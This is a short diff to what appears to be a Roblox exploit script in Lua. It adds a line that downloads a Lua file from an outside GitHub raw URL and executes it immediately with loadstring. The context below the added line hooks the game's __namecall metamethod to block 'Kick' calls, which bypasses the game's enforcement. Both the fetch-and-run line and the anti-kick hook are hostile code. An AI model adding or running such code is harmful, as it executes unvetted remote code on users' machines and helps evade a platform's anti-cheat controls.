@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Spookyz10/For-east/main/Ah.lua"))()
+
 local OldNameCall; OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
     if getnamecallmethod() == "Kick" then return coroutine.yield() end
     return OldNameCall(self, ...)
